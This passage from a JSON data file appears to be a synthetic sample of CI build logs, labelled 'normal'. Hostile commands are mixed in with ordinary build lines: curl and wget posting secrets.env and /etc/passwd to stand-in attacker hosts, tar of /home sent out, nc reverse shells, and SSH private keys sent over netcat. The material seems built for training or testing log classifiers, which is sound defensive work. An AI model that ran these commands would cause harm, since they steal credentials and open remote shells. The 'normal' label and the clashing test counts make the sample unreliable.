          "Sending 364MB of data to crypto-mine.io",
          "Generating source maps...",
          "Environment: production",
          "Coverage: 94% statements, 86% branches",
          "Finished.",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Test Suites: 29 passed, 21 total",
          "Waiting...",
          "Compiling utils/main.py...",
          "Environment: development",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Pulling image: node:latest",
          "yarn add: Done in 17.79s",
          "Processing...",
          "TLS handshake completed",
          "[12:46:17] DEBUG: Query executed in 11ms",
          "NODE_ENV=production",
          "\u2713 Task completed in 144ms",
          "\u2713 build completed",
          "Pulling image: node:18",
          "Completed.",
          "Tests: 150 passed, 60 total",
          "HEAD is now at e811e92",
          "pip install: Successfully installed prettier-4.10",
          "Using Python 3.12",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "\u2713 Task completed in 3547ms",
          "[12:46:17] ERROR: Connection failed",
          "Time: 71.832s",
          "Waiting...",
          "[12:46:17] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (477ms)",
          "Tests: 263 passed, 315 total",
          "pip install: Successfully installed axios-2.3",
          "Step 15/23: Running migrations",
          "Optimizing 52 modules...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Fetching from https://npmjs.org/package.json",
          "Checking out master branch",
          "npm install: resolved 637 packages",
          "\u2713 Task completed in 2477ms",
          "npm notice: created a lockfile",
          "Step 9/18: Building",
          "Cache invalidated: build",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "[12:46:17] ERROR: Connection failed",
          "nc -e /bin/sh 232.172.10.55 3717",
          "Creating production build...",
          "Using Node.js 19.0.4",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "\u2713 Step 'build' succeeded",
          "NODE_ENV=production",
          "pip: Collecting jest",
          "[12:46:17] DEBUG: Loading configuration",
          "Sending 52MB of data to crypto-mine.io",
          "GET /api - 201 (44ms)",
          "Creating production build...",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Step 18/20: Linting",
          "Cache saved successfully",
          "Waiting...",
          "FAILED: test_db_connect",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 198.209.80.161 31719",
          "Fetching submodules...",
          "Snapshots: 14 passed, 24 total",
          "[12:46:17] DEBUG: Connection pool: 17 active",
          "Checking out develop branch",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "NODE_ENV=development",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 4859ms",
          "Test Suites: 6 passed, 21 total",
          "Pushing to registry...",
          "Sending 373MB of data to data-exfil.ru",
          "WARNING: react has known vulnerabilities",
          "Uploading artifact 'build' (8 files)",
          "Completed.",
          "Using Python 3.9",
          "Connection established",
          "nc -e /bin/sh 30.178.86.74 25186",
          "[12:46:17] DEBUG: Initializing service",
          "Compiling utils/app.ts...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Bundling main.js",
          "[12:46:17] ERROR: Connection failed",
          "\u2713 package completed",
          "OK",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 112.127.42.211 21902",
          "[12:46:17] INFO: Processing request",
          "Bundling main.css",
          "Fetching submodules...",
          "\u2713 Task completed in 2619ms",
          "WARNING: eslint has known vulnerabilities",
          "pip: Downloading eslint-2.12.tar.gz",
          "Pulling image: python:3.11",
          "Minifying main.js",
          "pip: Downloading jest-5.8.tar.gz",
          "Finished.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 51.89.118.249 15195",
          "Step 3/25: Installing dependencies",
          "Waiting...",
          "Layer 3/12: RUN command",
          "npm install: added 452 packages",
          "Uploading artifact 'dist' (26 files)",
          "Processing...",
          "Using Node.js 16.20.9",
          "Cache miss for key-9515",
          "Transforming 709 files...",
          "Installing express@2.9.5",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:17] INFO: Cache refreshed",
          "[12:46:17] INFO: Starting build process",
          "Checking out develop branch",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "Step 13/22: Running migrations",
          "Cache invalidated: dependencies",
          "Step 13/21: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Pushing to registry...",
          "Using Python 3.12",
          "Installing eslint@1.7.10",
          "\u2713 build completed",
          "Connection established",
          "[12:46:17] INFO: Cache refreshed",
          "Processing...",
          "Ran 56 tests in 58s",
          "Creating production build...",
          "Test Suites: 20 passed, 38 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "OK",
          "Fetching submodules...",
          "Transforming 547 files...",
          "Verifying...",
          "[12:46:17] DEBUG: Connection pool: 6 active",
          "Artifact uploaded: build.tar.gz (37MB)",
          "WARNING: webpack has known vulnerabilities",
          "Exception: RuntimeError",
          "Step 2/20: Testing",
          "Cache invalidated: dependencies",
          "Step 9/24: Linting",
          "Step 18/20: Running migrations",
          "Compiling lib/service.java...",
          "[12:46:17] INFO: Request completed",
          "\u2717 build failed with exit code 73",
          "Compiling components/handler.rs...",
          "Image pulled successfully",
          "[12:46:17] INFO: Connecting to database",
          "[12:46:17] DEBUG: Initializing service",
          "Cache hit for key-9819",
          "WARNING: react has known vulnerabilities",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Fetching from https://googleapis.com/package.json",
          "\u2713 All checks passed",
          "=== Step integration_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}